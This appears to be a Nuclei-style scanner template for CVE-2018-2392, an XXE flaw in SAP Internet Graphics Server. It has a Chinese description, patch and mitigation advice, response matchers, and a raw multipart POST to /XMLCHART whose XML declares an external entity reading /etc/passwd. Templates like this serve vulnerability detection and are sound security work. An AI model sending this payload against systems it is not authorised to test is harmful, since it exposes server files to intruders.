id: CVE-2018-2392
info:
  name: SAP Internet Graphics Server (IGS) XML External Entity
  author:
  - l0ne1y
  description: |2-
     SAP Internet Graphics Server XXE漏洞
    SAP Internet Graphics Server是德国思爱普（SAP）公司的一款图形服务器。该产品能够在不同区域内生成图形或图表。

    SAP Internet Graphics Server中存在安全漏洞，该漏洞源于程序没有正确的校验XML外部实体。远程攻击者可利用该漏洞造成拒绝服务（SAP Internet Graphics Server无法使用）。以下版本受到影响：SAP Internet Graphics Server 7.20版本，7.20EXT版本，7.45版本，7.49版本，7.5版本。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/

    临时修复方案：
    1、禁用外部实体
    2、过滤用户提交的XML数据，关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - Picture
    - Info
    - /output/
  - type: word
    condition: or
    part: body
    words:
    - ImageMap
    - Errors
  - type: status
    status:
    - 200
  - type: word
    condition: and
    part: header
    words:
    - text/html
    - SAP Internet Graphics Server
  matchers-condition: and
  raw:
  - |
    POST /XMLCHART HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary={{randstr_1}}

    --{{randstr_1}}
    Content-Disposition: form-data; name="{{randstr_2}}"; filename="{{randstr_3}}.xml"
    Content-Type: application/xml

    <?xml version='1.0' encoding='UTF-8'?>
        <ChartData>
          <Categories>
            <Category>ALttP</Category>
          </Categories>
          <Series label="{{randstr_4}}">
            <Point>
              <Value type="y">12345</Value>
            </Point>
          </Series>
        </ChartData>
    --{{randstr_1}}
    Content-Disposition: form-data; name="{{randstr_5}}"; filename="{{randstr_6}}.xml"
    Content-Type: application/xml

    <?xml version='1.0' encoding='UTF-8'?>
        <!DOCTYPE Extension [<!ENTITY xxe SYSTEM "/etc/passwd">]>
        <SAPChartCustomizing version="1.1">
          <Elements>
            <ChartElements>
              <Title>
                <Extension>&xxe;</Extension>
              </Title>
            </ChartElements>
          </Elements>
        </SAPChartCustomizing>
    --{{randstr_1}}--
